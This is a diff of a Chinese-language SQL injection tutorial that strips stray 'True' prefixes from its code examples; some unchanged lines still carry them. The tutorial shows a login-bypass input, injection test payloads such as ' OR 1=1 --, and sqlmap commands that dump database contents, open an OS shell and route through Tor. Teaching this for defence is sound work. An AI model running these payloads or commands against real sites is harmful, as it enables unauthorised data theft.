@@ -70,7 +70,7 @@ SQL 注入可以按照不同的方式分类：
 #### 2.1.2 正常登录
 ```python
  # 正常登录
- Truelogin("admin", "123456")
+ login("admin", "123456")
  # 执行的 SQL：
  # SELECT * FROM users WHERE username = 'admin' AND password = '123456'
  ```
@@ -83,7 +83,7 @@ SQL 注入可以按照不同的方式分类：
 #### 2.1.3 SQL 注入攻击
 ```python
  # 攻击者使用特殊输入绕过登录
- Truelogin("admin' --", "anything")
+ login("admin' --", "anything")
  # 执行的 SQL：
  # SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
  # 注释符 -- 后面的内容被忽略，只验证了 username = 'admin'
@@ -165,15 +165,15 @@ SQL 注入成功的关键要素：
  True-- OR 测试
  ' OR 1=1 --
  ' OR '1'='1
- True1' OR '1'='1
+ 1' OR '1'='1
  True-- AND 测试
  ' AND 1=1 --
  ' AND 1=2 --
- True1' AND 1=1 --
- True1' AND 1=2 --
+ 1' AND 1=1 --
+ 1' AND 1=2 --
  True-- 数字型测试
- True1 AND 1=1
- True1 AND 1=2
+ 1 AND 1=1
+ 1 AND 1=2
  True-- LIKE 测试
  ' LIKE '%
  True%' OR 1=1 --
@@ -209,27 +209,27 @@ SQL 注入成功的关键要素：
 SQLMap 是最流行的自动化 SQL 注入工具。
 ```bash
  # 基本用法
- Truesqlmap -u "http://example.com/product.php?id=1"
+ sqlmap -u "http://example.com/product.php?id=1"
  # 测试 POST 请求
- Truesqlmap -u "http://example.com/login.php" --data="username=test&password=test"
+ sqlmap -u "http://example.com/login.php" --data="username=test&password=test"
  # 测试 Cookie
- Truesqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"
+ sqlmap -u "http://example.com/page.php" --cookie="PHPSESSID=abc123"
  # 获取数据库
- Truesqlmap -u "http://example.com/product.php?id=1" --dbs
+ sqlmap -u "http://example.com/product.php?id=1" --dbs
  # 获取表
- Truesqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
+ sqlmap -u "http://example.com/product.php?id=1" -D database_name --tables
  # 获取列
- Truesqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name --columns
+ sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name --columns
  # 获取数据
- Truesqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name -C column1,column2 --dump
+ sqlmap -u "http://example.com/product.php?id=1" -D database_name -T table_name -C column1,column2 --dump
  # 获取 Shell
- Truesqlmap -u "http://example.com/product.php?id=1" --os-shell
+ sqlmap -u "http://example.com/product.php?id=1" --os-shell
  # 执行自定义 SQL
- Truesqlmap -u "http://example.com/product.php?id=1" --sql-query="SELECT * FROM users"
+ sqlmap -u "http://example.com/product.php?id=1" --sql-query="SELECT * FROM users"
  # 批量测试
- Truesqlmap -m urls.txt
+ sqlmap -m urls.txt
  # 使用 Tor 匿名网络
- Truesqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
+ sqlmap -u "http://example.com/product.php?id=1" --tor --tor-type=SOCKS5
  ```
 
 #### 3.2.2 Burp Suite
@@ -251,26 +251,26 @@ SQLMap 是最流行的自动化 SQL 注入工具。
 #### 3.3.1 危险代码模式
 ```python
  # 危险模式 1：直接字符串拼接（f-string）
- Truesql = f"SELECT * FROM users WHERE id = {user_id}"
+ sql = f"SELECT * FROM users WHERE id = {user_id}"
  # 危险模式 2：字符串拼接（+）
- Truesql = "SELECT * FROM users WHERE id = " + user_id
+ sql = "SELECT * FROM users WHERE id = " + user_id
  # 危险模式 3：使用 % 格式化
- Truesql = "SELECT * FROM users WHERE id = %s" % user_id
+ sql = "SELECT * FROM users WHERE id = %s" % user_id
  # 危险模式 4：使用 format()
- Truesql = "SELECT * FROM users WHERE id = {}".format(user_id)
+ sql = "SELECT * FROM users WHERE id = {}".format(user_id)
  # 危险模式 5：没有参数化的存储过程调用
- Truecursor.callproc("get_user", (user_id,)) -- 取决于存储过程实现
+ cursor.callproc("get_user", (user_id,)) -- 取决于存储过程实现
  ```
 
 #### 3.3.2 安全代码模式
 ```python
  # 安全模式 1：参数化查询
- Truesql = "SELECT * FROM users WHERE id = %s"
- Truecursor.execute(sql, (user_id,))
+ sql = "SELECT * FROM users WHERE id = %s"
+ cursor.execute(sql, (user_id,))
  # 安全模式 2：ORM 查询
  user = session.query(User).filter(User.id == user_id).first()
  # 安全模式 3：使用 SQLAlchemy
- Trueresult = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
+ result = conn.execute(text("SELECT * FROM users WHERE id = :id"), {"id": user_id})
  ```
 
 #### 3.3.3 PHP 代码审计
